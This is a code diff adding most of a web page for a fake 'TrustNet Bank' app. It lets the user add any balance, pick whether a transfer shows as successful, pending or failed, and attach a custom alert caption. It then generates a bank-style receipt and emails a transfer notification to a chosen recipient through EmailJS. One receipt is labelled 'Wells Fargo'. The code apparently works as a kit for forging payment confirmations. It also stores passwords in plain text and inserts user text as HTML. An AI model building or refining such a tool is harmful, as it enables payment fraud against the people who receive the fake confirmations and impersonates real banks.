+            <span class="detail-value" id="sender-account-display"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Recipient Name:</span>
+            <span class="detail-value" id="recipient-name-display"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Recipient Account:</span>
+            <span class="detail-value" id="recipient-account-display"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Bank Name:</span>
+            <span class="detail-value" id="bank-name-display"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">SWIFT Code:</span>
+            <span class="detail-value" id="swift-code-display"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Remark:</span>
+            <span class="detail-value" id="remark-display"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Date & Time:</span>
+            <span class="detail-value" id="date-time-display"></span>
+          </div>
+        </div>
+        
+        <div class="receipt-buttons">
+          <button onclick="downloadReceipt()">📥 Download</button>
+          <button onclick="shareReceipt()">📤 Share</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Add Funds Modal -->
+  <div id="addFundsModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeAddFunds()">×</span>
+      <h3>💰 Add Funds</h3>
+      <input type="number" id="fund-amount" placeholder="Enter amount">
+      <select id="fund-currency">
+        <option value="$">$ USD - US Dollar</option>
+        <option value="€">€ EUR - Euro</option>
+        <option value="£">£ GBP - British Pound</option>
+        <option value="₦">₦ NGN - Nigerian Naira</option>
+        <option value="$">$ MXN - Mexican Peso</option>
+        <option value="NT$">NT$ TWD - New Taiwan Dollar</option>
+      </select>
+      <button onclick="addFunds()">Add Funds</button>
+    </div>
+  </div>
+
+  <!-- Balance Settings Modal -->
+  <div id="balanceSettingsModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeBalanceSettings()">×</span>
+      <h3>⚙️ Balance Settings</h3>
+      <label>Default Currency:</label>
+      <select id="default-currency">
+        <option value="$">$ USD - US Dollar</option>
+        <option value="€">€ EUR - Euro</option>
+        <option value="£">£ GBP - British Pound</option>
+        <option value="₦">₦ NGN - Nigerian Naira</option>
+        <option value="$">$ MXN - Mexican Peso</option>
+        <option value="NT$">NT$ TWD - New Taiwan Dollar</option>
+      </select>
+      <button onclick="saveBalanceSettings()">Save Settings</button>
+    </div>
+  </div>
+
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+  
+  <script>
+    // EmailJS Configuration
+    const EMAILJS_CONFIG = {
+      publicKey: 'bCEoUns2bsXKAYaF8',
+      serviceId: 'service_4k4r8x9',
+      templateId: 'template_2v3w5hy'
+    };
+
+    // Initialize EmailJS
+    (function() {
+      emailjs.init(EMAILJS_CONFIG.publicKey);
+    })();
+
+    let user = localStorage.getItem('user');
+    let currentTransaction = null;
+
+    // Initialize user data
+    if (user) {
+      document.getElementById('auth').classList.add('hidden');
+      document.getElementById('dashboard').classList.remove('hidden');
+      document.getElementById('user-name').innerText = user;
+      document.getElementById('dashboard-pic').src = localStorage.getItem('profilePic') || 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'100\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'40\' fill=\'%23e2e8f0\'/%3E%3Ctext x=\'50\' y=\'55\' text-anchor=\'middle\' font-size=\'20\' fill=\'%23666\'%3E👤%3C/text%3E%3C/svg%3E';
+      updateBalanceDisplay();
+    }
+
+    // Generate unique sender account number
+    function generateSenderAccount() {
+      const user = localStorage.getItem('user');
+      if (!user) return '1234567890';
+      
+      let senderAccount = localStorage.getItem('senderAccount');
+      if (!senderAccount) {
+        // Generate unique 10-digit account number
+        senderAccount = '2' + Math.floor(Math.random() * 900000000) + Math.floor(Math.random() * 99);
+        localStorage.setItem('senderAccount', senderAccount);
+      }
+      return senderAccount;
+    }
+
+    // Balance Management
+    function updateBalanceDisplay() {
+      const balance = parseFloat(localStorage.getItem('balance') || '0');
+      const currency = localStorage.getItem('defaultCurrency') || '$';
+      document.getElementById('balance-display').textContent = currency + balance.toFixed(2);
+    }
+
+    function showAddFunds() {
+      document.getElementById('addFundsModal').style.display = 'block';
+    }
+
+    function closeAddFunds() {
+      document.getElementById('addFundsModal').style.display = 'none';
+    }
+
+    function addFunds() {
+      const amount = parseFloat(document.getElementById('fund-amount').value);
+      const currency = document.getElementById('fund-currency').value;
+      
+      if (amount && amount > 0) {
+        const currentBalance = parseFloat(localStorage.getItem('balance') || '0');
+        const newBalance = currentBalance + amount;
+        localStorage.setItem('balance', newBalance.toString());
+        localStorage.setItem('defaultCurrency', currency);
+        updateBalanceDisplay();
+        closeAddFunds();
+        
+        // Clear input
+        document.getElementById('fund-amount').value = '';
+        
+        // Show success message
+        showSuccessAnimation('💰 Funds Added Successfully! 🎉🎊🎖️');
+      } else {
+        alert('Please enter a valid amount');
+      }
+    }
+
+    function showBalanceSettings() {
+      document.getElementById('balanceSettingsModal').style.display = 'block';
+      document.getElementById('default-currency').value = localStorage.getItem('defaultCurrency') || '$';
+    }
+
+    function closeBalanceSettings() {
+      document.getElementById('balanceSettingsModal').style.display = 'none';
+    }
+
+    function saveBalanceSettings() {
+      const currency = document.getElementById('default-currency').value;
+      localStorage.setItem('defaultCurrency', currency);
+      updateBalanceDisplay();
+      closeBalanceSettings();
+      alert('Settings saved successfully!');
+    }
+
+    // Success Animation with Sound
+    function showSuccessAnimation(message) {
+      const animation = document.createElement('div');
+      animation.className = 'success-animation';
+      animation.innerHTML = message;
+      document.body.appendChild(animation);
+      
+      // Play success sound
+      playSuccessSound();
+      
+      setTimeout(() => {
+        if (document.body.contains(animation)) {
+          document.body.removeChild(animation);
+        }
+      }, 3000);
+    }
+
+    function playSuccessSound() {
+      try {
+        // Create audio context for success sound
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioContext.createOscillator();
+        const gainNode = audioContext.createGain();
+        
+        oscillator.connect(gainNode);
+        gainNode.connect(audioContext.destination);
+        
+        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+        oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.1);
+        oscillator.frequency.setValueAtTime(1200, audioContext.currentTime + 0.2);
+        
+        gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+        
+        oscillator.start(audioContext.currentTime);
+        oscillator.stop(audioContext.currentTime + 0.5);
+      } catch (error) {
+        console.log('Audio not supported');
+      }
+    }
+
+    function register() {
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      
+      if (username && password) {
+        localStorage.setItem('user', username);
+        localStorage.setItem('password', password);
+        localStorage.setItem('balance', '0');
+        localStorage.setItem('defaultCurrency', '$');
+        location.reload();
+      } else {
+        alert('Please enter both username and password!');
+      }
+    }
+
+    function login() {
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const savedUser = localStorage.getItem('user');
+      const savedPassword = localStorage.getItem('password');
+      
+      if (savedUser && savedPassword && savedUser === username && savedPassword === password) {
+        document.getElementById('auth').classList.add('hidden');
+        document.getElementById('dashboard').classList.remove('hidden');
+        document.getElementById('user-name').innerText = savedUser;
+        document.getElementById('dashboard-pic').src = localStorage.getItem('profilePic') || 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'100\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'40\' fill=\'%23e2e8f0\'/%3E%3Ctext x=\'50\' y=\'55\' text-anchor=\'middle\' font-size=\'20\' fill=\'%23666\'%3E👤%3C/text%3E%3C/svg%3E';
+        updateBalanceDisplay();
+      } else {
+        alert('Invalid username or password. Please register if you don\'t have an account.');
+      }
+    }
+
+    function uploadProfilePic() {
+      const file = document.getElementById('profile-pic').files[0];
+      const reader = new FileReader();
+      reader.onloadend = function() {
+        localStorage.setItem('profilePic', reader.result);
+        document.getElementById('dashboard-pic').src = reader.result;
+      };
+      if (file) reader.readAsDataURL(file);
+    }
+
+    function logout() {
+      localStorage.removeItem('user');
+      localStorage.removeItem('password');
+      localStorage.removeItem('profilePic');
+      location.reload();
+    }
+
+    function showTransfer() {
+      document.getElementById('transfer').classList.remove('hidden');
+      document.getElementById('history').classList.add('hidden');
+      document.getElementById('settings').classList.add('hidden');
+      document.getElementById('receipt').classList.add('hidden');
+    }
+
+    function showHistory() {
+      document.getElementById('transfer').classList.add('hidden');
+      document.getElementById('history').classList.remove('hidden');
+      document.getElementById('settings').classList.add('hidden');
+      document.getElementById('receipt').classList.add('hidden');
+      
+      let history = JSON.parse(localStorage.getItem('history')) || [];
+      let historyHTML = '';
+      
+      if (history.length === 0) {
+        historyHTML = '<p style="text-align: center; color: #666; padding: 40px;">No transaction history yet. 📭</p>';
+      } else {
+        history.forEach((transaction, index) => {
+          const alertCaptionHTML = transaction.alertCaption ? 
+            `<div class="alert-caption">${transaction.alertCaption}</div>` : '';
+          
+          let statusClass, statusText;
+          if (transaction.status === 'success') {
+            statusClass = 'status-successful';
+            statusText = 'Successful';
+          } else if (transaction.status === 'pending') {
+            statusClass = 'status-pending';
+            statusText = 'Pending';
+          } else if (transaction.status === 'failed') {
+            statusClass = 'status-failed';
+            statusText = 'Failed';
+          }
+
+          historyHTML += `
+            <div class="history-item receipt-card">
+              <div class="receipt-header">
+                <div class="receipt-logo">🏦 TrustNet Bank</div>
+                <p class="receipt-subtitle">Transaction Receipt</p>
+              </div>
+              <div class="receipt-amount">${transaction.currency}${transaction.amount}</div>
+              <div class="${statusClass}">${statusText}</div>
+              ${alertCaptionHTML}
+              <div class="transaction-details">
+                <div class="detail-row">
+                  <span class="detail-label">Transaction ID:</span>
+                  <span class="detail-value">${transaction.transferId}</span>
+                </div>
+                <div class="detail-row">
+                  <span class="detail-label">Recipient:</span>
+                  <span class="detail-value">${transaction.accName}</span>
+                </div>
+                <div class="detail-row">
+                  <span class="detail-label">Date:</span>
+                  <span class="detail-value">${transaction.date}</span>
+                </div>
+              </div>
+              <div style="text-align: center; margin-top: 15px;">
+                <button onclick="viewTransactionDetails(${index})" style="width: 100%; background: linear-gradient(135deg, #0a3e80 0%, #1e5aa8 100%); padding: 10px;">👁️ View Full Receipt</button>
+              </div>
+            </div>`;
+        });
+      }
+      
+      document.getElementById('history-list').innerHTML = historyHTML;
+    }
+
+    function viewTransactionDetails(index) {
+      let history = JSON.parse(localStorage.getItem('history')) || [];
+      if (index >= 0 && index < history.length) {
+        const transaction = history[index];
+        showTransactionReceipt(transaction);
+      }
+    }
+
+    function showTransactionReceipt(transaction) {
+      document.getElementById('transfer').classList.add('hidden');
+      document.getElementById('history').classList.add('hidden');
+      document.getElementById('settings').classList.add('hidden');
+      document.getElementById('receipt').classList.remove('hidden');
+      
+      // Populate receipt data
+      document.getElementById('receipt-amount').innerText = transaction.currency + transaction.amount;
+      
+      // Set status with proper class
+      const statusContainer = document.getElementById('receipt-status-container');
+      let statusClass, statusText;
+      if (transaction.status === 'success') {
+        statusClass = 'status-successful';
+        statusText = 'Successful';
+      } else if (transaction.status === 'pending') {
+        statusClass = 'status-pending';
+        statusText = 'Pending';
+      } else if (transaction.status === 'failed') {
+        statusClass = 'status-failed';
+        statusText = 'Failed';
+      }
+      statusContainer.innerHTML = `<div class="${statusClass}">${statusText}</div>`;
+      
+      document.getElementById('transaction-id').innerText = transaction.transferId;
+      document.getElementById('sender-name-display').innerText = transaction.senderName;
+      document.getElementById('sender-account-display').innerText = transaction.senderAccount;
+      document.getElementById('recipient-name-display').innerText = transaction.accName;
+      document.getElementById('recipient-account-display').innerText = transaction.accNumber;
+      document.getElementById('bank-name-display').innerText = transaction.bankName;
+      document.getElementById('swift-code-display').innerText = transaction.swiftCode;
+      document.getElementById('remark-display').innerText = transaction.remark || '';
+      document.getElementById('date-time-display').innerText = transaction.date;
+      
+      // Display alert caption if present
+      const alertCaptionDisplay = document.getElementById('alert-caption-display');
+      if (transaction.alertCaption) {
+        alertCaptionDisplay.innerHTML = `<div class="alert-caption">${transaction.alertCaption}</div>`;
+      } else {
+        alertCaptionDisplay.innerHTML = '';
+      }
+      
+      currentTransaction = transaction;
+    }
+
+    function showSettings() {
+      document.getElementById('settings').classList.remove('hidden');
+      document.getElementById('transfer').classList.add('hidden');
+      document.getElementById('history').classList.add('hidden');
+      document.getElementById('receipt').classList.add('hidden');
+    }
+
+    // Enhanced function to send email notification
+    async function sendEmailNotification(transactionData) {
+      try {
+        const emailParams = {
+          name: transactionData.accName,
+          acc_number: transactionData.accNumber,
+          bank_name: transactionData.bankName,
+          swift: transactionData.swiftCode,
+          currency: transactionData.currency,
+          amount: transactionData.amount,
+          transactionNo: transactionData.transferId,
+          date_time: transactionData.date,
+          to_email: transactionData.recipientEmail,
+          sender_name: transactionData.senderName,
+          remark: transactionData.remark || 'Trust Net Bank Transfer',
+          alert_caption: transactionData.alertCaption || ''
+        };
+
+        console.log('Sending email with params:', emailParams);
+        const response = await emailjs.send(
+          EMAILJS_CONFIG.serviceId,
+          EMAILJS_CONFIG.templateId,
+          emailParams
+        );
+
+        console.log('Email sent successfully:', response);
+        return { success: true, response };
+      } catch (error) {
+        console.error('Email sending failed:', error);
+        return { success: false, error };
+      }
+    }
+
+    // Enhanced submit transfer function with email integration
+    async function submitTransfer() {
+      // Validate required fields
+      const requiredFields = [
+        'sender-name', 'acc-number', 'acc-name', 'bank-name', 
+        'swift-code', 'amount', 'recipient-email'
+      ];
+      
+      for (let fieldId of requiredFields) {
+        const field = document.getElementById(fieldId);
+        if (!field.value.trim()) {
+          alert(`Please fill in the ${fieldId.replace('-', ' ')}`);
+          field.focus();
+          return;
+        }
+      }
+
+      // Validate email format
+      const email = document.getElementById('recipient-email').value;
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(email)) {
+        alert('Please enter a valid email address');
+        document.getElementById('recipient-email').focus();
+        return;
+      }
+
+      // Show loading state
+      const submitBtn = document.getElementById('submit-btn');
+      const emailStatus = document.getElementById('email-status');
+      
+      submitBtn.classList.add('loading');
+      submitBtn.textContent = '⏳ Processing Transfer...';
+      submitBtn.disabled = true;
+
+      const data = {
+        senderName: document.getElementById('sender-name').value,
+        senderAccount: generateSenderAccount(),
+        accNumber: document.getElementById('acc-number').value,
+        accName: document.getElementById('acc-name').value,
+        bankName: document.getElementById('bank-name').value,
+        swiftCode: document.getElementById('swift-code').value,
+        remark: document.getElementById('remark').value || 'Trust Net Bank Transfer',
+        amount: document.getElementById('amount').value,
+        currency: document.getElementById('currency').value,
+        status: document.getElementById('transaction-status').value,
+        alertCaption: document.getElementById('alert-caption').value,
+        date: new Date().toLocaleString(),
+        transferId: 'TN' + Math.floor(Math.random() * 1000000000),
+        recipientEmail: document.getElementById('recipient-email').value
+      };
+
+      try {
+        // Save transaction to history
+        let history = JSON.parse(localStorage.getItem('history')) || [];
+        history.push(data);
+        localStorage.setItem('history', JSON.stringify(history));
+
+        // Send email notification
+        emailStatus.innerHTML = '<div class="email-status">📧 Sending email notification...</div>';
+        
+        const emailResult = await sendEmailNotification(data);
+        
+        if (emailResult.success) {
+          emailStatus.innerHTML = '<div class="email-status email-success">✅ Email notification sent successfully!</div>';
+        } else {
+          emailStatus.innerHTML = '<div class="email-status email-error">⚠️ Transfer completed but email notification failed. Please contact support.</div>';
+          console.error('Email error:', emailResult.error);
+        }
+
+        // Update balance display
+        updateBalanceDisplay();
+
+        // Show transaction receipt
+        showTransactionReceipt(data);
+        
+        // Show success animation with sound
+        showSuccessAnimation('🎉 Transaction Successful! 🎊🎖️');
+
+        // Clear form fields
+        document.getElementById('sender-name').value = '';
+        document.getElementById('acc-number').value = '';
+        document.getElementById('acc-name').value = '';
+        document.getElementById('bank-name').value = '';
+        document.getElementById('swift-code').value = '';
+        document.getElementById('remark').value = '';
+        document.getElementById('amount').value = '';
+        document.getElementById('alert-caption').value = '';
+        document.getElementById('recipient-email').value = '';
+
+        // Optional: Send to backend if you have one
+        try {
+          await fetch("/submit_transfer", {
+            method: "POST",
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({...data, emailSent: emailResult.success})
+          });
+        } catch (backendError) {
+          console.log('Backend submission failed (optional):', backendError);
+        }
+
+      } catch (error) {
+        console.error('Transfer submission error:', error);
+        emailStatus.innerHTML = '<div class="email-status email-error">❌ Transfer failed. Please try again.</div>';
+      } finally {
+        // Reset button state
+        submitBtn.classList.remove('loading');
+        submitBtn.textContent = '🚀 Submit Transfer';
+        submitBtn.disabled = false;
+        
+        // Clear status after 5 seconds
+        setTimeout(() => {
+          emailStatus.innerHTML = '';
+        }, 5000);
+      }
+    }
+
+    function deleteAccount() {
+      if (confirm('Are you sure you want to delete your account? This cannot be undone.')) {
+        localStorage.clear();
+        alert('Account deleted.');
+        location.reload();
+      }
+    }
+
+    function borrowLoan() {
+      alert('💰 Loan feature coming soon. Stay tuned!');
+    }
+
+    function downloadReceipt() {
+      if (!currentTransaction) {
+        alert('No receipt to download');
+        return;
+      }
+
+      html2canvas(document.querySelector("#receipt-card")).then(canvas => {
+        const link = document.createElement('a');
+        link.download = `trustnet-bank-receipt-${currentTransaction.transferId}.png`;
+        link.href = canvas.toDataURL();
+        link.click();
+      }).catch(error => {
+        console.error('Download failed:', error);
+        alert('Download failed. Please try again.');
+      });
+    }
+
+    function shareReceipt() {
+      if (!currentTransaction) {
+        alert('No receipt to share');
+        return;
+      }
+
+      if (navigator.share) {
+        html2canvas(document.querySelector("#receipt-card")).then(canvas => {
+          canvas.toBlob(blob => {
+            const file = new File([blob], `trustnet-receipt-${currentTransaction.transferId}.png`, { type: 'image/png' });
+            navigator.share({
+              title: 'TrustNet Bank Receipt',
+              text: `Transaction Receipt - ${currentTransaction.currency}${currentTransaction.amount}`,
+              files: [file]
+            });
+          });
+        });
+      } else {
+        // Fallback for browsers that don't support Web Share API
+        const receiptText = `
+🏦 Wells Fargo Receipt
+💰 Amount: ${currentTransaction.currency}${currentTransaction.amount}
+👤 From: ${currentTransaction.senderName}
+👤 To: ${currentTransaction.accName}
+🏛️ Bank: ${currentTransaction.bankName}
+📅 Date: ${currentTransaction.date}
+🆔 Transaction ID: ${currentTransaction.transferId}
+        `;
+        
+        if (navigator.clipboard) {
+          navigator.clipboard.writeText(receiptText).then(() => {
+            alert('Receipt details copied to clipboard!');
+          });
+        } else {
+          alert('Sharing not supported on this device');
+        }
+      }
+    }
+
+    // Close modals when clicking outside
+    window.onclick = function(event) {
+      const addFundsModal = document.getElementById('addFundsModal');
+      const balanceSettingsModal = document.getElementById('balanceSettingsModal');
+      
+      if (event.target == addFundsModal) {
+        closeAddFunds();
+      }
+      if (event.target == balanceSettingsModal) {
+        closeBalanceSettings();
+      }
+    }
+
+    // Initialize on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      // Set focus on username field
+      document.getElementById('username').focus();
+    });
+  </script>
+
+  <!-- Tawk.to Chat -->
+  <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+      var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+      s1.async=true;
+      s1.src='https://embed.tawk.to/681402c9e8036f191c6e5e69/default';
+      s1.charset='UTF-8';
+      s1.setAttribute('crossorigin','*');
+      s1.parentNode.insertBefore(s1,s0);
+    })();
+  </script>
+</body>
+</html>
